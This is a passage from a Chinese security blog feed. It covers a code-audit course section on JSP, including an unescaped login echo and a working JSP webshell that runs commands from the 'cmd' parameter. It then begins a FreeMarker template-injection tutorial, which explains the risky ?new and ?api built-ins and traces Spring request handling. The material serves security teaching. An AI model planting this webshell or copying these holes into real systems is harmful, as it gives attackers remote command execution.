class="hljs-string">&quot;text/html; charset=utf-8&quot;</span> /&gt;<br>    &lt;h2&gt;登录&lt;/h2&gt;<br> <br>    &lt;form action=<span class="hljs-string">&quot;login.jsp&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span>&gt;<br>        账号: &lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;username&quot;</span>/&gt;&lt;br&gt;<br>        密码: &lt;input type=<span class="hljs-string">&quot;password&quot;</span> name=<span class="hljs-string">&quot;password&quot;</span>/&gt;&lt;br&gt;<br>        &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;登录&quot;</span>&gt;<br>    &lt;/form&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>login.jsp</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br><br>&lt;!DOCTYPE html PUBLIC <span class="hljs-string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span><br><span class="hljs-string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;meta http-equiv=<span class="hljs-string">&quot;Content-Type&quot;</span> content=<span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span>&gt;<br>    &lt;title&gt;主页&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;%<br>    <span class="hljs-type">String</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;username&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">password</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;password&quot;</span>);<br>%&gt;<br>&lt;%<br>    <span class="hljs-comment">//模拟登录成功与否</span><br>    <span class="hljs-keyword">if</span>(username.equals(<span class="hljs-string">&quot;admin&quot;</span>) &amp;&amp; password.equals(<span class="hljs-string">&quot;123456&quot;</span>))&#123;<br>        response.getWriter().write(<span class="hljs-string">&quot;登录成功&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        response.getWriter().write(<span class="hljs-string">&quot;登录失败&quot;</span>);<br>    &#125;<br>%&gt;<br><br>用户名：&lt;%= username%&gt; <br>密码：&lt;%= password%&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><h2 id="9、JSP木马"><a href="#9、JSP木马" class="headerlink" title="9、JSP木马"></a>9、JSP木马</h2><p>JSP木马也可以称作JSP Webshell，如果对方在上传文件或其他功能没有做防护的话，攻击者可以利用任意文件上传漏洞将恶意代码传到后端，继而攻击者可以达到操作目标网站的目的。</p><p>木马demo</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStreamReader&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.nio.charset.Charset&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;Title&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;%<br>    <span class="hljs-type">String</span> <span class="hljs-variable">retStr</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-type">char</span>[] tmpBuffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">char</span>[<span class="hljs-number">1024</span>];<br>    <span class="hljs-type">int</span> <span class="hljs-variable">nRet</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>    <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();<br>    <span class="hljs-type">InputStreamReader</span> <span class="hljs-variable">inputStreamReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(inputStream, Charset.forName(<span class="hljs-string">&quot;GB2312&quot;</span>));<br>    <span class="hljs-keyword">while</span> ((nRet = inputStreamReader.read(tmpBuffer, <span class="hljs-number">0</span>, <span class="hljs-number">1024</span>)) != -<span class="hljs-number">1</span>) &#123;<br>        retStr += <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(tmpBuffer, <span class="hljs-number">0</span>, nRet);<br>    &#125;<br>    inputStreamReader.close();<br><br>%&gt;<br>&lt;%= retStr%&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计课程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSTI-Freemarker模板注入漏洞</title>
    <link href="/2023/09/02/SSTI-Freemarker%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/09/02/SSTI-Freemarker%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="SSTI-Freemarker模板注入漏洞"><a href="#SSTI-Freemarker模板注入漏洞" class="headerlink" title="SSTI-Freemarker模板注入漏洞"></a>SSTI-Freemarker模板注入漏洞</h1><h2 id="一、Freemarker-简介"><a href="#一、Freemarker-简介" class="headerlink" title="一、Freemarker 简介"></a>一、Freemarker 简介</h2><p>FreeMarker 是一款 模板引擎： 即一种基于模板和要改变的数据， 并用来生成输出文本(HTML网页，电子邮件，配置文件，源代码等)的通用工具。 它不是面向最终用户的，而是一个 Java类库，是一款程序员可以嵌入他们所开发产品的组件。<br>模板编写为 FreeMarker Template Language (FTL)。它是简单的，专用的语言， 不是像 PHP 那样成熟的编程语言。 那就意味着要准备数据在真实编程语言中来显示，比如数据库查询和业务运算， 之后模板显示已经准备好的数据。在模板中，你可以专注于如何展现数据， 而在模板之外可以专注于要展示什么数据。<br><img src="/image/1692253648346-5980e250-383b-4d88-9738-2c1ee45a8d27.png"><br>这种方式通常被称为 MVC (模型 视图 控制器) 模式s，对于动态网页来说，是一种特别流行的模式。 它帮助从开发人员(Java 程序员)中分离出网页设计师(HTML设计师)。设计师无需面对模板中的复杂逻辑， 在没有程序员来修改或重新编译代码时，也可以修改页面的样式。<br>而 FreeMarker 最初的设计，是被用来在 MVC 模式的 Web 开发框架中生成 HTML 页面的，它没有被绑定到 Servlet 或 HTML 或任意 Web 相关的东西上。它也可以用于非 Web 应用环境中。</p><h2 id="二、Freemarker-使用"><a href="#二、Freemarker-使用" class="headerlink" title="二、Freemarker 使用"></a>二、Freemarker 使用</h2><h3 id="1、Spring-boot-Freemarker示例"><a href="#1、Spring-boot-Freemarker示例" class="headerlink" title="1、Spring boot + Freemarker示例"></a>1、Spring boot + Freemarker示例</h3><p>pom.xml 添加依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-freemarker<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>spring-boot-starter-freemarker-2.7.13.pom</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.7.13<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>compile<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.freemarker<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>freemarker<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.3.32<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>compile<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-context-support<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.3.28<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>compile<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><p>application.yml 添加配置</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span><br>  <span class="hljs-attr">freemarker:</span><br>    <span class="hljs-comment"># 模板后缀名</span><br>    <span class="hljs-attr">suffix:</span> <span class="hljs-string">.ftl</span><br>    <span class="hljs-comment"># 文档类型</span><br>    <span class="hljs-attr">content-type:</span> <span class="hljs-string">text/html</span><br>    <span class="hljs-comment"># 页面编码</span><br>    <span class="hljs-attr">charset:</span> <span class="hljs-string">UTF-8</span><br>    <span class="hljs-comment"># 页面缓存</span><br>    <span class="hljs-attr">cache:</span> <span class="hljs-literal">false</span><br>    <span class="hljs-comment"># 模板路径</span><br>    <span class="hljs-attr">template-loader-path:</span> <span class="hljs-string">classpath:/templates/</span><br></code></pre></td></tr></table></figure><p>新建 index.ftl</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>FreeMarker<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">table</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>姓名<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>年龄<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>$&#123;user.name&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>$&#123;user.age&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>新建 UserController </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.example.demo.bean.User;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.ui.Model;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserController</span> &#123;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/index&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">index</span><span class="hljs-params">(Model model)</span> &#123;<br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br>        user.setAge(<span class="hljs-number">5</span>);<br>        user.setName(<span class="hljs-string">&quot;li&quot;</span>);<br>        model.addAttribute(<span class="hljs-string">&quot;user&quot;</span>, user);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;index&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行 Spring boot 项目，访问 index 成功显示<br><img src="/image/1692255786949-7af6c0fe-7a87-48ab-8959-9c1b0e564adc.png" alt="image.png"></p><h3 id="2、Freemarker-模板"><a href="#2、Freemarker-模板" class="headerlink" title="2、Freemarker 模板"></a>2、Freemarker 模板</h3><p>见官方文档（<a href="http://freemarker.foofun.cn/dgui_template.html">http://freemarker.foofun.cn/dgui_template.html</a>）</p><h4 id="1-、总体结构"><a href="#1-、总体结构" class="headerlink" title="(1)、总体结构"></a>(1)、总体结构</h4><p>实际上用程序语言编写的程序就是模板。 FTL (代表FreeMarker模板语言)。 这是为编写模板设计的非常简单的编程语言。<br>模板(FTL编程)是由如下部分混合而成的：</p><ul><li>文本：文本会照着原样来输出。</li><li>插值：这部分的输出会被计算的值来替换。插值由 ${ and } 所分隔(或者 #{ and }，这种风格已经不建议再使用了；<a href="http://freemarker.foofun.cn/ref_depr_numerical_interpolation.html">点击查看更多</a>)。</li><li>FTL 标签：FTL标签和HTML标签很相似，但是它们却是给FreeMarker的指示， 而且不会打印在输出内容中。</li><li>注释：注释和HTML的注释也很相似，但它们是由 &lt;#– 和 –&gt;来分隔的。注释会被FreeMarker直接忽略， 更不会在输出内容中显示。</li></ul><p>我们来看一个具体的模板。其中的内容已经用颜色来标记了： 文本， 插值， FTL 标签， 注释。为了看到可见的 换行符， 这里使用了 [BR]。<br><img src="/image/1692256878378-75f36ccf-7214-42d2-980c-e573fc17bde2.png" alt="image.png">s<br>注：</p><ul><li>FTL是区分大小写的。 list 是指令的名称而 List 就不是。类似地 ${name} 和 ${Name} 或 ${NAME} 也是不同的。</li><li>插值 仅仅可以在 文本 中使用。 (也可以是字符串表达式；请参考 <a href="http://freemarker.foofun.cn/dgui_template_exp.html#dgui_template_exp_stringop_interpolation">后续内容</a>)</li><li>FTL 标签 不可以在其他 FTL 标签 和 插值中使用。比如， 这样做是 <em>错误</em> 的： &lt;#if &lt;#include ‘foo’&gt;&#x3D;’bar’&gt;…&lt;&#x2F;#if&gt;</li><li>注释 可以放在 FTL 标签 和 插值中</li></ul><h4 id="2-、指令"><a href="#2-、指令" class="headerlink" title="(2)、指令"></a>(2)、指令</h4><p>使用 FTL标签来调用 <strong>指令</strong>。 在示例中已经调用了 list 指令。在语法上我们使用了两个标签： &lt;#list animals as animal&gt; 和 &lt;&#x2F;#list&gt;。<br>FTL 标签分为两种：</p><ul><li>开始标签： &lt;#_directivename_ _parameters_&gt;</li><li>结束标签： &lt;&#x2F;#_directivename_&gt;</li></ul><p>除了标签以 # 开头外，其他都和HTML，XML的语法很相似。 如果标签没有嵌套内容(在开始标签和结束标签之间的内容)，那么可以只使用开始标签。 例如 &lt;#if <em>something_&gt;</em>…<em>&lt;&#x2F;#if&gt;， 而FreeMarker知道 &lt;#include _something_&gt; 中的 include 指令没有可嵌套的内容。<br><em>parameters</em> 的格式由 <em>directivename_来决定。<br>事实上，指令有两种类型： <a href="http://freemarker.foofun.cn/gloss.html#gloss.predefinedDirective">预定义指令</a> 和 <a href="http://freemarker.foofun.cn/gloss.html#gloss.userDefinedDirective">用户自定义指令</a>。 对于用户自定义的指令使用 @ 来代替 #，比如，&lt;@mydirective _parameters_&gt;</em>…</em>&lt;&#x2F;@mydirective&gt;。 更深的区别在于如果指令没有嵌套内容，那么必须这么使用 &lt;@mydirective _parameters_ &#x2F;&gt;，这和XML语法很相似 (例如 <img _..._ />)。<br>assign 指令:主要是用于为该模板页面创建或替换一个顶层变量。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;#assign name1=value1 name2=value2 ... nameN=valueN&gt;<br>or<br>&lt;#assign same as above... in namespacehash&gt;<br>or<br>&lt;#assign name&gt;<br>  capture <span class="hljs-built_in">this</span><br>&lt;/#assign&gt;<br>or<br>&lt;#assign name in namespacehash&gt;<br>  capture <span class="hljs-built_in">this</span><br>&lt;/#assign&gt;<br><br>Tips:name为变量名，value为表达式，namespacehash是命名空间创建的哈希表，是表达式。<br><br><span class="hljs-keyword">for</span> example:<br>&lt;#<span class="hljs-type">assign</span> <span class="hljs-variable">seq</span> <span class="hljs-operator">=</span> [<span class="hljs-string">&quot;foo&quot;</span>, <span class="hljs-string">&quot;bar&quot;</span>, <span class="hljs-string">&quot;baz&quot;</span>]&gt;<span class="hljs-comment">//创建了一个变量名为seq的序列</span><br></code></pre></td></tr></table></figure><h4 id="3-、表达式"><a href="#3-、表达式" class="headerlink" title="(3)、表达式"></a>(3)、表达式</h4><p>当需要给插值或者指令参数提供值时，可以使用变量或其他复杂的表达式。 例如，我们设x为8，y为5，那么 (x + y)&#x2F;2 的值就会被处理成数字类型的值6.5。<br>在我们展开细节之前，先来看一些具体的例子：</p><ul><li>当给插值提供值时：插值的使用方式为 ${<em>expression</em>}， 把它放到你想输出文本的位置上，然后给值就可以打印出来了。 即 ${(5 + 8)&#x2F;2} 会打印出 ‘’6.5’’ 来 (如果输出的语言不是美国英语，也可能打印出’’6,5’’来)。</li><li>当给指令参数提供值时：在入门章节我们已经看到 if 指令的使用了。这个指令的语法是：&lt;#if <em>expression_&gt;</em>…_&lt;&#x2F;#if&gt;。 这里的表达式计算结果必须是布尔类型的。比如 &lt;#if 2 &lt; 3&gt; 中的 2 &lt;3 (2小于3)是结果为 true 的布尔表达式。</li></ul><h4 id="4-、插值"><a href="#4-、插值" class="headerlink" title="(4)、插值"></a>(4)、插值</h4><p>插值的使用格式是： ${<em>expression</em>}，这里的 <em>expression</em> 可以是所有种类的表达式(比如 ${100 + x})。<br>插值是用来给 <em>表达式</em> 插入具体值然后转换为文本(字符串)。插值仅仅可以在两种位置使用：在 <a href="http://freemarker.foofun.cn/dgui_template_overallstructure.html">文本区</a> (比如 Hello ${name}!) 和 <a href="http://freemarker.foofun.cn/dgui_template_exp.html#dgui_template_exp_stringop_interpolation">字符串表达式</a> (比如 &lt;#include “&#x2F;footer&#x2F;${company}.html”&gt;)中。<br>表达式的结果必须是字符串，数字或者日期&#x2F;时间&#x2F;日期-时间值， 因为(默认是这样)仅仅这些值可以被插值自动转换为字符串。其它类型的值 (比如布尔值，序列)必须 “手动地” 转换成字符串(后续会有一些建议)， 否则就会发生错误，中止模板执行。</p><h3 id="3、Freemarker-内建函数"><a href="#3、Freemarker-内建函数" class="headerlink" title="3、Freemarker 内建函数"></a>3、Freemarker 内建函数</h3><p>Freemarker 提供了很多内置函数供开发者使用，具体见<a href="http://freemarker.foofun.cn/ref_builtins.html">官方文档</a>，存在风险的函数为 new 和 api,详情如下：</p><h4 id="1-、new"><a href="#1-、new" class="headerlink" title="(1)、new"></a>(1)、new</h4><p>用来创建一个确定的 TemplateModel 实现变量的内建函数。<br>在 ? 的左边你可以指定一个字符串， 值为 TemplateModel 实现类的完全限定名。 结果是调用构造方法生成一个方法变量，然后将新变量返回。<br>例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;#-- Creates an user-defined directive be calling the parameterless constructor of the class --&gt;<br>&lt;#assign word_wrapp = &quot;com.acmee.freemarker.WordWrapperDirective&quot;?new()&gt;<br>&lt;#-- Creates an user-defined directive be calling the constructor with one numerical argument --&gt;<br>&lt;#assign word_wrapp_narrow = &quot;com.acmee.freemarker.WordWrapperDirective&quot;?new(40)&gt;<br></code></pre></td></tr></table></figure><p>该内建函数可以创建任意的 Java 对象，只要类实现了 TemplateModel 接口即可创建进而使用这些对象， 并且可以触发没有实现 TemplateModel 接口的类的静态初始化块。<br> 2.3.17后可使用 Configuration.setNewBuiltinClassResolver(TemplateClassResolver) 、new_builtin_class_resolver 限制 new 内建函数对类的访问。 </p><h4 id="2-、api"><a href="#2-、api" class="headerlink" title="(2)、api"></a>(2)、api</h4><p>api 内建函数于 FreeMarker 2.3.22 版本出现，之前版本不存在。<br>如果value本身支持这个额外的特性， value?api 提供访问 value 的API (通常是 Java API)，比如 <code>value?api.someJavaMethod()</code>， 当需要调用对象的Java方法时，这种方式很少使用， 但是 FreeMarker 揭示的value的简化视图的模板隐藏了它，也没有相等的内建函数。 例如，当有一个 Map，并放入数据模型 (使用默认的对象包装器)，模板中的 myMap.myMethod() 基本上翻译成Java的 (<code>(Method) myMap.get(&quot;myMethod&quot;)).invoke(...)，</code>因此不能调用 myMethod。如果编写了 <code>myMap?api.myMethod()</code> 来代替，那么就是Java中的 myMap.myMethod()。<br>api 内建函数使用存在以下限制：</p><ul><li>api_builtin_enabled 配置设置项必须设置为 true。 2.3.22 版本及之后默认为 false</li><li>值本身要支持它。我们在讨论当模板看到的值，它是通过对象包装从原始对象值(来自于数据模型或者Java方法的返回值)中创建的。 因此，这就依赖 FreeMarker 的配置设置项 object_wrapper， 还有被包装的(原始)对象：<ul><li>当对象包装器是 DefaultObjectWrapper ，并且它的 incompatibleImprovements 设置为 2.3.22 或更高 (在这里看如何设置它) (事实上，要做的是将它的 useAdaptersForContainer 属性设置为 true，但那是提到的 incompatibleImprovements 的默认值)时，从 Map 和 List 中得到FTL值支持 ?api。其它的 java.util.Collections 也是这样，如果 DefaultObjectWrapper 的 forceLegacyNonListCollections 属性设置为 false (默认是 true， 这是为了更好的向后兼容拆包)。</li><li>当被纯 BeansWrapper 包装时，所有值都支持 ?api。但是再次重申，如果有其它方法，就避免使用它。</li><li>实现了 freemarker.template.TemplateModelWithAPISupport 接口， 自定义的 TemplateModel 可以支持 ?api。</li></ul></li></ul><p>当在配置中不允许或值本身不支持 ?api 时使用了它， 就会中止模板处理并发生错误。</p><h2 id="三、Freemarker-模板注入漏洞分析"><a href="#三、Freemarker-模板注入漏洞分析" class="headerlink" title="三、Freemarker 模板注入漏洞分析"></a>三、Freemarker 模板注入漏洞分析</h2><h3 id="1、获取模板"><a href="#1、获取模板" class="headerlink" title="1、获取模板"></a>1、获取模板</h3><p>Spring boot 所有http请求均调用org.springframework.web.servlet.FrameworkServlet#service()方法进行处理，调用super.service()进行处理<br><img src="/image/1692601460428-d9d31724-a209-438a-962d-e3433eefae48.png" alt="image.png"><br>调用至javax.servlet.http.HttpServlet#service()<br><img src="/image/1692601561814-a1b02020-2ce9-448b-99f5-3a2780118cde.png" alt="image.png"><br>调用至javax.servlet.http.HttpServlet#doget()<br><img src="/image/1692601590997-6936a0a2-abb7-41fb-99ab-d8ad8257e147.png" alt="image.png"><br>调用至rg.springframework.web.servlet.FrameworkServlet#processRequest()<br><img src="/image/1692601622764-805dc5eb-68d7-4fe8-b188-80f063cf12a6.png" alt="image.png"><br>org.springframework.web.servlet.DispatcherServlet#doService()  –&gt;<br>org.springframework.web.servlet.DispatcherServlet #doDispatch()  –&gt;</p><p><img src="/image/image-20230831222714908.png" alt="image-20230831222714908"></p><p>org.springframework.web.servlet.DispatcherServlet #processDispatchResult()  –&gt;<br>调用至org.springframework.web.servlet.DispatcherServlet#render()<br><img src="/image/1692602149932-c030eb2f-68b4-4e5b-a68e-aa9e057e1c89.png" 